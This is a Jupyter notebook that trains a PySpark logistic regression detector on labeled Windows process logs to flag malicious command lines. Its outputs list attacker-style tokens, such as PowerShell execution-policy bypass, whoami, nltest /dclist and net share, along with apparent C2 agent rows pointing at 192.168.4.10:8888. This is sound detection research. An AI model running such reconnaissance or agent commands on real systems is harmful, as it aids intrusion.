{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pyspark.conf import SparkConf\n",
    "from pyspark.sql import SparkSession\n",
    "import pyspark.sql.functions as F\n",
    "import pyspark.sql.types as T\n",
    "import pandas as pd\n",
    "import re\n",
    "import matplotlib.pyplot as plt\n",
    "from pyspark.ml import feature, evaluation, Pipeline\n",
    "from pyspark.ml.classification import LogisticRegression\n",
    "from pyspark.ml.feature import VectorAssembler\n",
    "from pyspark.ml.evaluation import BinaryClassificationEvaluator\n",
    "from pyspark.ml.tuning import CrossValidator, ParamGridBuilder\n",
    "from functools import reduce\n",
    "from pyspark.sql import DataFrame\n",
    "from pyspark.sql import Row"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<pyspark.conf.SparkConf at 0x7fea2668bb00>"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "conf = (SparkConf()\n",
    "            .setAppName('data_explore')\n",
    "            .setMaster('spark://spark-master:7077')\n",
    "       )\n",
    "conf.set(\"spark.executor.memory\", \"6g\")\n",
    "conf.set(\"spark.driver.maxResultSize\", \"0\")\n",
    "conf.set(\"spark.sql.shuffle.partitions\", \"6\")\n",
    "conf.set(\"spark.default.parallelism\", \"6\")\n",
    "conf.set(\"spark.driver.memory\", \"3g\") "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "spark = SparkSession.builder.config(conf=conf).getOrCreate()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[('spark.default.parallelism', '6'),\n",
       " ('spark.executor.id', 'driver'),\n",
       " ('spark.executor.memory', '6g'),\n",
       " ('spark.app.id', 'app-20191114005714-0039'),\n",
       " ('spark.driver.host', 'b673edb6b90c'),\n",
       " ('spark.driver.memory', '3g'),\n",
       " ('spark.rdd.compress', 'True'),\n",
       " ('spark.master', 'spark://spark-master:7077'),\n",
       " ('spark.serializer.objectStreamReset', '100'),\n",
       " ('spark.driver.maxResultSize', '0'),\n",
       " ('spark.driver.port', '42789'),\n",
       " ('spark.submit.deployMode', 'client'),\n",
       " ('spark.sql.shuffle.partitions', '6'),\n",
       " ('spark.ui.showConsoleProgress', 'true'),\n",
       " ('spark.app.name', 'data_explore')]"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "spark.sparkContext.getConf().getAll()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# TODO\n",
    "\n",
    "+ test final model against this dataset: https://github.com/hunters-forge/mordor\n",
    "+ see if writing model (model.save) with partitionBy param helps\n",
    "---\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "DataFrame[timestamp: string, hostname: string, kernel: string, host_platform: string, process_name: string, parent_process: string, login_id: string, event_id: int, command_line: string, class_label: int]"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df = (spark.read.format('csv')\n",
    "      .option('inferSchema', 'true')\n",
    "      .option('header', 'true')\n",
    "      .option('escape', '\"')\n",
    "      .load('hdfs://namenode:9000/data/labeled_process_logs.csv') \n",
    "      .dropna() # orginal dataset had 52,025 rows, this operation drops 682 rows\n",
    "     )\n",
    "df.cache()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Data Cleaning and Engineering\n",
    "\n",
    "---\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The target labels are unbalanced, and will result in a model with high bias that won't generalize well.  the minority class (1) will be resampled"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f949c180ac8>"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "df.groupBy('class_label').count().toPandas().plot.bar(x='class_label', y='count')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "51343"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.count()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "sc = spark.sparkContext\n",
    "\n",
    "# create a list of minority class rdd objects\n",
    "list_of_rdds = [df.filter('class_label == 1').sample(withReplacement=True, fraction=.1).rdd for x in range(1000)]\n",
    "\n",
    "# combine the rdds\n",
    "combined_rdds = sc.union(list_of_rdds)\n",
    "\n",
    "# create a df from the original dataset and the resampled minority class\n",
    "combined_df = spark.createDataFrame(sc.union([df.rdd, combined_rdds]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CPU times: user 408 ms, sys: 186 ms, total: 595 ms\n",
      "Wall time: 5min 51s\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<matplotlib.axes._subplots.AxesSubplot at 0x7f94c90de240>"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "%%time\n",
    "combined_df.groupBy('class_label').count().toPandas().plot.bar(x='class_label', y='count')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Save bootstrapped data to disk and reload to continue modeling"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "# write resampled df to disk\n",
    "combined_df.toPandas().to_csv('resampled_df.csv', header=True, index=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "DataFrame[timestamp: timestamp, hostname: string, kernel: string, host_platform: string, process_name: string, parent_process: string, login_id: string, event_id: int, command_line: string, class_label: int]"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# load resampled df and cache\n",
    "resampled_df = (spark.read.format('csv')\n",
    "      .option('inferSchema', 'true')\n",
    "      .option('header', 'true')\n",
    "      .option('escape', '\"')\n",
    "      .load('hdfs://namenode:9000/data/resampled_df.csv') \n",
    "     )\n",
    "resampled_df.cache()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Clean process,path fields and create command line tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "common_strings = ['windows', 'system32', 'cmd.exe', 'sandcat.exe', 'c', 'windowspowershell', 'powershell.exe', '']\n",
    "\n",
    "import re\n",
    "@F.udf(returnType=T.StringType())\n",
    "def clean_input(s):\n",
    "    pattern = re.compile(r\"\"\"\n",
    "        [:|\"?']\n",
    "        | --field-trial-handle=.*\\d+\n",
    "        | //.*com(/.*)/\n",
    "        | \\s*\"\\s*\n",
    "        | \\{.*\\}\n",
    "        | [=;(),]\n",
    "        | \\\\\n",
    "        | //\n",
    "        | \\s+\\.\\s+ \n",
    "        | $.\n",
    "        | $_.\n",
    "    \"\"\", re.VERBOSE)\n",
    "    \n",
    "    return ','.join([x.lower() for x in re.sub(pattern, ' ', s).split() if x.lower() not in common_strings and len(x) >= 2])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pyspark.sql.functions import regexp_extract, regexp_replace, col, count, split, size, to_date\n",
    "resampled_df = resampled_df.select(\n",
    "    '*',\n",
    "    regexp_extract(col('process_name'), r\"(\\w?:?.*\\\\?\\w+\\s?\\w+\\\\)\", 0).alias('process_path'),\n",
    "#     split(col('command_line'), '\\s+(?=[-/]+)').alias('cmd_line_split')\n",
    ").withColumn(\n",
    "    'class_label', (col('class_label').cast('int'))\n",
    ").withColumn(\n",
    "    'trusted_path', (col('process_path').like('%C:\\Program Files%') | col('process_path').like('%C:\\Windows%') | col('process_path').like('%C:\\PROGRA~2%') |col('process_path').like('%Program Files (x86)%')).cast('int')\n",
    ").withColumn(\n",
    "    '_timestamp', F.to_timestamp(col('timestamp'))\n",
    ").withColumn(\n",
    "    'process_name', regexp_extract(col('process_name'), r'(\\w+.?\\w+$)', 0)\n",
    ").withColumn(\n",
    "    'parent_process', regexp_extract(col('parent_process'), r'(\\w+.?\\w+$)', 0)\n",
    ").withColumn(\n",
    "    'cmd_line_tokens', split(clean_input(col('command_line')), ',')\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pyspark.sql.functions import regexp_extract, regexp_replace, col, count, split, size, to_date\n",
    "resampled_df = resampled_df.select(\n",
    "    '*',\n",
    "    regexp_extract(col('process_name'), r\"(\\w?:?.*\\\\?\\w+\\s?\\w+\\\\)\", 0).alias('process_path'),\n",
    ").withColumn(\n",
    "    'class_label', (col('class_label').cast('int'))\n",
    ").withColumn(\n",
    "    'trusted_path', (col('process_path').like('%C:\\Program Files%') | col('process_path').like('%C:\\Windows%') \\\n",
    "                     | col('process_path').like('%C:\\PROGRA~2%') |col('process_path').like(r'%Program Files (x86)%') \\\n",
    "                     | col('process_path').like(r'%C:\\Users%') | col('process_path').like('%C:\\ProgramData%')).cast('int')\n",
    ").withColumn(\n",
    "    'trusted_path', F.when(col('trusted_path')==1,0).otherwise(1)\n",
    ").withColumn(\n",
    "    '_timestamp', F.to_timestamp(col('timestamp'))\n",
    ").withColumn(\n",
    "    'process_name', regexp_extract(col('process_name'), r'(\\w+.?\\w+$)', 0)\n",
    ").withColumn(\n",
    "    'parent_process', regexp_extract(col('parent_process'), r'(\\w+.?\\w+$)', 0)\n",
    ").withColumn(\n",
    "    'cmd_line_tokens', split(clean_input(col('command_line')), ',')\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[('timestamp', 'timestamp'),\n",
       " ('hostname', 'string'),\n",
       " ('kernel', 'string'),\n",
       " ('host_platform', 'string'),\n",
       " ('process_name', 'string'),\n",
       " ('parent_process', 'string'),\n",
       " ('login_id', 'string'),\n",
       " ('event_id', 'int'),\n",
       " ('command_line', 'string'),\n",
       " ('class_label', 'int'),\n",
       " ('process_path', 'string'),\n",
       " ('trusted_path', 'int'),\n",
       " ('_timestamp', 'timestamp'),\n",
       " ('cmd_line_tokens', 'array<string>')]"
      ]
     },
     "execution_count": 76,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "resampled_df.dtypes"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Cleaned command line tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-----------------------------------------------------+\n",
      "|cmd_line_tokens                                      |\n",
      "+-----------------------------------------------------+\n",
      "|[svchost.exe, -k, localservice, -p, -s, eventsystem] |\n",
      "|[svchost.exe, -k, localservicenetworkrestricted, -p] |\n",
      "|[svchost.exe, -k, networkservice, -p, -s, cryptsvc]  |\n",
      "|[program, files, vmware, vmware, tools, vmtoolsd.exe]|\n",
      "|[program, files, defender, msmpeng.exe]              |\n",
      "+-----------------------------------------------------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "resampled_df.select('cmd_line_tokens').sample(.10).show(5, False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create train, validation, test split"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "training_df, validation_df, testing_df = resampled_df.randomSplit([0.6, 0.3, 0.1], seed=0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[63801, 31852, 10690]"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "[training_df.count(), validation_df.count(), testing_df.count()]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create freq and tfidf pipeline and fit to training data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "cv_pipeline = Pipeline(stages=[\n",
    "    feature.CountVectorizer(minTF=1, minDF=3, inputCol='cmd_line_tokens', outputCol='tf')\n",
    "]).fit(training_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+---------------------------------------------------------+\n",
      "|tf                                                       |\n",
      "+---------------------------------------------------------+\n",
      "|(1551,[99,100,133,361],[1.0,1.0,1.0,1.0])                |\n",
      "|(1551,[99,100,133,135,214,643],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|(1551,[768,1343],[1.0,1.0])                              |\n",
      "|(1551,[768,973],[1.0,1.0])                               |\n",
      "|(1551,[99,100,133,135,209,604],[1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "+---------------------------------------------------------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "cv_pipeline.transform(resampled_df).select('tf').show(5,truncate=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1551"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(cv_pipeline.stages[0].vocabulary)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "idf_pipeline = Pipeline(stages=[\n",
    "    cv_pipeline, feature.IDF(inputCol='tf', outputCol='tfidf')\n",
    "]).fit(training_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "va = VectorAssembler(inputCols=['tfidf','trusted_path'], outputCol='features')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Modeling\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### create logistic regression model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "lr = LogisticRegression(featuresCol='features', labelCol='class_label')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "lr_pipeline = Pipeline(stages=[\n",
    "    idf_pipeline, \n",
    "    va,\n",
    "    lr\n",
    "]).fit(training_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "vocabulary = idf_pipeline.stages[0].stages[0].vocabulary\n",
    "weights = lr_pipeline.stages[-1].coefficients.toArray()[:-1]  # the last feature in the feature vector `trusted_path` is removed\n",
    "coeffs_df = pd.DataFrame({'token': vocabulary, 'weight': weights})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Inference"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-----------------+\n",
      "|     avg(correct)|\n",
      "+-----------------+\n",
      "|0.999874419188748|\n",
      "+-----------------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "lr_pipeline.transform(validation_df).\\\n",
    "    select(F.expr('float(prediction = class_label)').alias('correct')).\\\n",
    "    select(F.avg('correct')).show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### The positive class is 1 (malicious) so the positive weights indicate a feature that contributes positively to being classified as malicious"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>token</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>/c</td>\n",
       "      <td>20.773966</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>-c</td>\n",
       "      <td>10.356001</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>-executionpolicy</td>\n",
       "      <td>9.011314</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>bypass</td>\n",
       "      <td>9.011314</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>142</th>\n",
       "      <td>get-nettcpconnection</td>\n",
       "      <td>7.079780</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>53</th>\n",
       "      <td>whoami</td>\n",
       "      <td>6.705766</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>28</th>\n",
       "      <td>gpresult</td>\n",
       "      <td>5.325423</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>/r</td>\n",
       "      <td>5.285763</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>138</th>\n",
       "      <td>remove-item</td>\n",
       "      <td>4.958975</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>arp</td>\n",
       "      <td>4.416403</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>-a</td>\n",
       "      <td>4.408173</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>392</th>\n",
       "      <td>win32_useraccount</td>\n",
       "      <td>3.427503</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>50</th>\n",
       "      <td>net</td>\n",
       "      <td>3.353656</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>49</th>\n",
       "      <td>share</td>\n",
       "      <td>3.337951</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>-path</td>\n",
       "      <td>2.812891</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>-force</td>\n",
       "      <td>2.692914</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>141</th>\n",
       "      <td>nltest</td>\n",
       "      <td>2.473062</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>139</th>\n",
       "      <td>/dclist</td>\n",
       "      <td>2.446069</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>140</th>\n",
       "      <td>%userdomain%</td>\n",
       "      <td>2.446069</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>62</th>\n",
       "      <td>-group</td>\n",
       "      <td>2.286127</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                    token     weight\n",
       "12                     /c  20.773966\n",
       "2                      -c  10.356001\n",
       "3        -executionpolicy   9.011314\n",
       "4                  bypass   9.011314\n",
       "142  get-nettcpconnection   7.079780\n",
       "53                 whoami   6.705766\n",
       "28               gpresult   5.325423\n",
       "27                     /r   5.285763\n",
       "138           remove-item   4.958975\n",
       "24                    arp   4.416403\n",
       "23                     -a   4.408173\n",
       "392     win32_useraccount   3.427503\n",
       "50                    net   3.353656\n",
       "49                  share   3.337951\n",
       "25                  -path   2.812891\n",
       "18                 -force   2.692914\n",
       "141                nltest   2.473062\n",
       "139               /dclist   2.446069\n",
       "140          %userdomain%   2.446069\n",
       "62                 -group   2.286127"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "coeffs_df.sort_values('weight', ascending=False).head(20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Example of malicious tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+------------------------------------------------------------------------+\n",
      "|cmd_line_tokens                                                         |\n",
      "+------------------------------------------------------------------------+\n",
      "|[users, public, -server, http, 192.168.4.10, 8888, -group, my_group, -v]|\n",
      "|[users, public, -server, http, 192.168.4.10, 8888, -group, my_group, -v]|\n",
      "|[users, public, -server, http, 192.168.4.10, 8888, -group, my_group, -v]|\n",
      "|[users, public, -server, http, 192.168.4.10, 8888, -group, my_group, -v]|\n",
      "|[users, public, -server, http, 192.168.4.10, 8888, -group, my_group, -v]|\n",
      "+------------------------------------------------------------------------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "training_df.filter('class_label == 1').sample(.1).select('cmd_line_tokens').show(5, truncate=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### The negative class is 0 (benign) so the negative weights indicate a feature that contributes negatively to being classified as benign"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>token</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>1026</th>\n",
       "      <td>poweron-vm-default.bat</td>\n",
       "      <td>-4.660522</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1174</th>\n",
       "      <td>poweroff-vm-default.bat</td>\n",
       "      <td>-4.570643</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>221</th>\n",
       "      <td>googleupdate.exe</td>\n",
       "      <td>-4.259672</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>101</th>\n",
       "      <td>v1.0</td>\n",
       "      <td>-3.864912</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>215</th>\n",
       "      <td>update</td>\n",
       "      <td>-3.586016</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1044</th>\n",
       "      <td>/x</td>\n",
       "      <td>-2.260320</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1087</th>\n",
       "      <td>verclsid.exe</td>\n",
       "      <td>-2.260320</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1110</th>\n",
       "      <td>reg.exe</td>\n",
       "      <td>-2.035638</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>527</th>\n",
       "      <td>wmic.exe</td>\n",
       "      <td>-1.880898</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>978</th>\n",
       "      <td>onedrivesetup.exe</td>\n",
       "      <td>-1.827687</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>375</th>\n",
       "      <td>/q</td>\n",
       "      <td>-1.790098</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>825</th>\n",
       "      <td>wmiadap.exe</td>\n",
       "      <td>-1.462692</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>381</th>\n",
       "      <td>sc.exe</td>\n",
       "      <td>-1.427663</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>920</th>\n",
       "      <td>nltest.exe</td>\n",
       "      <td>-1.275573</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>288</th>\n",
       "      <td>wmiprvse.exe</td>\n",
       "      <td>-1.162732</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>292</th>\n",
       "      <td>-f</td>\n",
       "      <td>-1.145023</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>561</th>\n",
       "      <td>gpresult.exe</td>\n",
       "      <td>-1.053337</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>297</th>\n",
       "      <td>tools</td>\n",
       "      <td>-0.934200</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>614</th>\n",
       "      <td>-u</td>\n",
       "      <td>-0.831333</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>248</th>\n",
       "      <td>rundll32.exe</td>\n",
       "      <td>-0.713754</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                        token    weight\n",
       "1026   poweron-vm-default.bat -4.660522\n",
       "1174  poweroff-vm-default.bat -4.570643\n",
       "221          googleupdate.exe -4.259672\n",
       "101                      v1.0 -3.864912\n",
       "215                    update -3.586016\n",
       "1044                       /x -2.260320\n",
       "1087             verclsid.exe -2.260320\n",
       "1110                  reg.exe -2.035638\n",
       "527                  wmic.exe -1.880898\n",
       "978         onedrivesetup.exe -1.827687\n",
       "375                        /q -1.790098\n",
       "825               wmiadap.exe -1.462692\n",
       "381                    sc.exe -1.427663\n",
       "920                nltest.exe -1.275573\n",
       "288              wmiprvse.exe -1.162732\n",
       "292                        -f -1.145023\n",
       "561              gpresult.exe -1.053337\n",
       "297                     tools -0.934200\n",
       "614                        -u -0.831333\n",
       "248              rundll32.exe -0.713754"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "coeffs_df.sort_values('weight').head(20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Example of benign tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-------------------------------------------------------------------------------------------------------------------------------+\n",
      "|cmd_line_tokens                                                                                                                |\n",
      "+-------------------------------------------------------------------------------------------------------------------------------+\n",
      "|[winsxs, amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.30_none_788560eb0ef1f3b0, tiworker.exe, -embedding]|\n",
      "|[rundll32.exe, edgehtml.dll, #141, microsoft.windowscamera_8wekyb3d8bbwe]                                                      |\n",
      "|[rundll32.exe, edgehtml.dll, #141, microsoft.oneconnect_8wekyb3d8bbwe]                                                         |\n",
      "|[svchost.exe, -k, dcomlaunch, -p, -s, plugplay]                                                                                |\n",
      "|[svchost.exe, -k, netsvcs, -p, -s, themes]                                                                                     |\n",
      "+-------------------------------------------------------------------------------------------------------------------------------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "training_df.filter('class_label == 0').sample(.1).select('cmd_line_tokens').show(5, truncate=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create another model with elastic net regularization to control overfitting and mitigate noisy data\n",
    "+ will grid search over these regParam and elasticNetParam parameters during validation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "en_lr_estimator = Pipeline(stages=[\n",
    "    idf_pipeline,\n",
    "    va,\n",
    "    LogisticRegression(featuresCol='features',labelCol='class_label',regParam=0.02,elasticNetParam=0.3)\n",
    "])\n",
    "\n",
    "en_lr_pipeline = en_lr_estimator.fit(training_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Re-examine the coefficients of the model to determine how well it learned the weights for the tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "coefs = en_lr_pipeline.stages[-1].coefficients.toArray()[:-1]  # the last feature in the feature vector `trusted_path` is removed\n",
    "en_lr_word_coefs = pd.DataFrame({'token': cv_pipeline.stages[0].vocabulary, 'weight': coefs})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ malicious tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.4707941383104754"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "en_lr_word_coefs.loc[en_lr_word_coefs.loc[:, 'token'] == 'arp', 'weight'].values[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
